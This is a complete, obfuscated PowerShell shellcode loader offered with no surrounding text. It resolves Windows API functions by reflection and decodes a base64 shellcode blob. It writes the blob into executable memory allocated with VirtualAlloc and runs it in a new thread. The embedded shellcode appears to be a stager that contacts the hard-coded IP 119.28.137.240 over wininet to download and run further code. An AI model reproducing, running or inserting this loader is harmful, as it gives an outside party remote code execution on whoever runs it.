function tyqW__Z0Hl1x {
	Param ($cWm, $qmDNASr)		
	$zoWGDZ3as = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $zoWGDZ3as.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zoWGDZ3as.GetMethod('GetModuleHandle')).Invoke($null, @($cWm)))), $qmDNASr))
}

function cV6oIw7zn {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $gy2CJToJGyy,
		[Parameter(Position = 1)] [Type] $e0cR = [Void]
	)
	
	$kwjDXpdQ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$kwjDXpdQ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $gy2CJToJGyy).SetImplementationFlags('Runtime, Managed')
	$kwjDXpdQ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $e0cR, $gy2CJToJGyy).SetImplementationFlags('Runtime, Managed')
	
	return $kwjDXpdQ.CreateType()
}

[Byte[]]$v0qI = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2i7AQAA6AcBAAAvYjBsdGJUS0tkajUtVzM5YUo4ZUtDd1ZwWUZfeXIxYnloY3FMUmJLTGdvSzBKWkdwN2RTX21sSUtwcHowWFhxTFNyX1dUR2FTajRlck9UMUNnVW9yNS00ckdCNWNqN3pmaVdNV29mY0NqQUFzS3J5U0lRYWphSQBQaFeJn8b/1YnGU2gAMuCEU1NTV1NWaOtVLjv/1ZZqCl9ogDMAAIngagRQah9WaHVGnob/1VNTU1NWaC0GGHv/1YXAdRRoiBMAAGhE8DXg/9VPdc3oSwAAAGpAaAAQAABoAABAAFNoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTPiwcBw4XAdeVYw1/oa////zExOS4yOC4xMzcuMjQwALvwtaJWagBT/9U=")
		
$v6n = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tyqW__Z0Hl1x kernel32.dll VirtualAlloc), (cV6oIw7zn @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $v0qI.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($v0qI, 0, $v6n, $v0qI.length)

$jsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tyqW__Z0Hl1x kernel32.dll CreateThread), (cV6oIw7zn @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$v6n,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tyqW__Z0Hl1x kernel32.dll WaitForSingleObject), (cV6oIw7zn @([IntPtr], [Int32]))).Invoke($jsi,0xffffffff) | Out-Null
